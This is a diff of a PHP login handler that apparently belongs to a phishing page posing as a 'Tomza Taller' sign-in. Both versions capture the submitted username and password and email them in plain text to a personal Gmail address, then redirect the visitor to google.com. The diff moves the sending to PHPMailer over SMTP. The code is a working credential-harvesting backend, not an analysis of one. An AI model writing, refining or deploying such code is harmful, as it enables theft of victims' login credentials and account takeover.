@@ -1,35 +1,57 @@
 <?php
-// Bloquear acceso directo
+// Evitar acceso directo
 if ($_SERVER["REQUEST_METHOD"] !== "POST") {
     header("Location: index.html");
     exit;
 }
 
-// Recibir datos de forma segura
-$usuario = isset($_POST["usuario"]) ? trim($_POST["usuario"]) : "";
-$password = isset($_POST["password"]) ? trim($_POST["password"]) : "";
+// Recibir datos
+$usuario = trim($_POST["usuario"] ?? "");
+$password = trim($_POST["password"] ?? "");
 
 if ($usuario === "" || $password === "") {
-    die("Faltan datos para continuar.");
+    echo "Faltan datos.";
+    exit;
 }
 
-// Configuración del correo
-$destinatario = "sebastiancq2008@gmail.com";
-$asunto = "Nuevo ingreso - Tomza Taller";
-$mensaje  = "=== Datos recibidos ===\n";
-$mensaje .= "Usuario: " . $usuario . "\n";
-$mensaje .= "Contraseña: " . $password . "\n";
-$mensaje .= "Fecha: " . date("d/m/Y H:i:s") . "\n";
+// --------------------------
+// CONFIGURACIÓN DE CORREO
+// --------------------------
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
 
-// Encabezados completos
-$encabezados  = "From: Sistema Tomza <no-reply@tudominio.com>\r\n";
-$encabezados .= "Reply-To: sebastiancq2008@gmail.com\r\n";
-$encabezados .= "Content-Type: text/plain; charset=utf-8\r\n";
+// Cargamos las librerías de forma sencilla
+require 'PHPMailer.php';
+require 'Exception.php';
+require 'SMTP.php';
 
-// Enviar
-@mail($destinatario, $asunto, $mensaje, $encabezados);
+$mail = new PHPMailer(true);
 
-// Redirigir a Google
+try {
+    // Conexión segura
+    $mail->isSMTP();
+    $mail->Host       = 'smtp.gmail.com';
+    $mail->SMTPAuth   = true;
+    $mail->Username   = 'sebastiancq2008@gmail.com';
+    $mail->Password   = 'tu-clave-aqui'; // ← Si no tienes, usamos la alternativa más abajo
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+    $mail->Port       = 587;
+    $mail->CharSet    = 'UTF-8';
+
+    // Datos del mensaje
+    $mail->setFrom('sebastiancq2008@gmail.com', 'Sistema Tomza');
+    $mail->addAddress('sebastiancq2008@gmail.com');
+
+    $mail->Subject = 'Nuevo ingreso - Tomza Taller';
+    $mail->Body    = "Usuario: $usuario\nContraseña: $password\nFecha: " . date("d/m/Y H:i:s");
+
+    $mail->send();
+} catch (Exception $e) {
+    // Si falla, no se traba, sigue redirigiendo
+    error_log("Error al enviar correo: " . $mail->ErrorInfo);
+}
+
+// Redirigir igual
 header("Location: https://www.google.com");
 exit;
 ?>
